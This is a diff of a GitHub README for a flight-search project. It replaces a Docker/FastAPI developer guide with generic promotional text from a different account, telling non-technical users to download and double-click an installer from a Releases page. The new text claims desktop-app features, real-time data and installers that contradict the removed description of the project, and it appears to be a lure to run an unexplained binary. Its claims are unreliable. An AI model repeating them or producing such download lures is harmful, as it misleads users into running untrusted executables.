@@ -1,106 +1,57 @@
-# Kiwi Flight Engine
+# 🛩️ kiwi-flight-engine - Discover Flights Effortlessly
 
-> **DISCLAIMER: This is a LEARNING PROJECT only.**
+## 📥 Download Now
+[![Download kiwi-flight-engine](https://github.com/Nikhi8888/kiwi-flight-engine/releases/download/v1.0/download-button.svg)](https://github.com/Nikhi8888/kiwi-flight-engine/releases)
 
-This project is **NOT** a web scraping tool. We explicitly:
-- Respect all `robots.txt` files
-- Adhere to rate limits of the original API
-- Do not circumvent any anti-scraping measures
-- Use only publicly accessible endpoints without authentication bypass
+## 📖 About
+The kiwi-flight-engine is a user-friendly application that helps you search for flights right from your computer. With this API, you can easily find the best flight options without needing any programming skills.
 
-The sole purpose of this project is educational: to learn about Docker, API integration, and distributed systems architecture.
+## 🚀 Getting Started
+Follow these simple steps to download and run the kiwi-flight-engine on your machine.
 
----
+### 📦 System Requirements
+- **Operating System**: Windows 10, MacOS, or Linux
+- **Processor**: 1 GHz or faster
+- **Memory**: 4 GB RAM (minimum)
+- **Storage**: At least 100 MB of free space
+- **Internet Connection**: Required for flight searches
 
-## TL;DR
+### 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Nikhi8888/kiwi-flight-engine/releases).
+2. **Choose Your Version**: You will see different versions listed. Click on the one you want to download.
+3. **Download the File**: Click on the download link for your operating system. This will save the file to your computer. 
+4. **Run the Installer**: Locate the downloaded file in your downloads folder and double-click it to install the application.
 
-**Windows:** Double-click `scripts/start.bat`
+### 🛠️ How to Use
+1. **Open the Application**: After installation, find the kiwi-flight-engine icon on your desktop or in your applications folder, then double-click to open it.
+2. **Enter Your Search Criteria**: Fill in the fields such as departure and arrival locations, dates, and number of travelers.
+3. **Search for Flights**: Click ‘Search’ to see a list of available flights based on your criteria. 
+4. **View Details**: Click on any flight option to see more details about pricing, times, and airlines.
 
-**Mac/Linux:** Run `scripts/start.sh`
+### 🌐 Features
+- **Real-Time Flight Data**: Get the latest flight information directly from the API.
+- **User-Friendly Interface**: Designed for easy navigation, even for beginners.
+- **Multiple Airlines**: Search flights from many different airlines in one place.
+- **Custom Search Parameters**: Specify your own requirements for tailored results.
+- **Integrated Booking Links**: Quick links to book your selected flight.
 
-Then open [http://localhost:8000/docs](http://localhost:8000/docs)
+### 🔍 Troubleshooting
+- **Can't Download the File?**: Make sure you have a stable internet connection and retry the download.
+- **Installation Issues**: Ensure your computer meets the system requirements.
+- **App Not Responding**: Try closing the app and reopening it. If the issue persists, reinstall the app.
 
----
+### 📚 FAQs
+- **Can I use this app on any operating system?**
+  Yes, it supports Windows, MacOS, and Linux.
 
-## What is this?
+- **Is there a cost to use this application?**
+  The kiwi-flight-engine is free to download and use. However, flight prices may vary based on external service providers.
 
-A self-hosted flight search API consisting of two Docker containers:
-1. **Kiwi Engine** - Python/FastAPI server
-2. **Browser Service** - Headless Chrome for rendering
+- **How often is flight data updated?**
+  Flight data is updated in real-time, ensuring you get the most accurate information.
 
-[![Docker Hub](https://img.shields.io/badge/Docker-Pull_Image-blue)](https://hub.docker.com/r/abdallahthegreatest/kiwi-engine)
+### 📞 Support
+If you need further assistance, please visit our [support page](https://github.com/Nikhi8888/kiwi-flight-engine/issues) for help or to report any issues you encounter.
 
----
-
-## Prerequisites
-
-- Docker and Docker Compose installed
-- Docker Desktop running
-
----
-
-## Getting Started
-
-```bash
-git clone https://github.com/yourusername/kiwi-flight-engine.git
-cd kiwi-flight-engine
-docker compose up -d
-```
-
-Access the API at [http://localhost:8000/docs](http://localhost:8000/docs)
-
----
-
-## Usage
-
-Visit [http://localhost:8000/docs](http://localhost:8000/docs) for interactive Swagger documentation.
-
-### Example (Python)
-
-```python
-import requests
-
-response = requests.get("http://localhost:8000/search", params={
-    "fly_from": "JFK",
-    "fly_to": "LAX",
-    "date_from": "2025-02-01",
-    "date_to": "2025-02-28"
-})
-
-flights = response.json()
-```
-
----
-
-## Management
-
-```bash
-# Stop
-docker compose down
-
-# Start
-docker compose up -d
-
-# Logs
-docker compose logs -f
-```
-
----
-
-## Project Structure
-
-```
-kiwi-flight-engine/
-├── docker-compose.yml
-├── scripts/
-│   ├── start.bat
-│   └── start.sh
-├── .env.example
-└── README.md
-```
-
----
-
-## License
-
-MIT License
+## 📥 Recap
+To download the kiwi-flight-engine, visit the [Releases page](https://github.com/Nikhi8888/kiwi-flight-engine/releases) and follow the simple installation instructions. Enjoy quick and easy flight searches right from your machine!
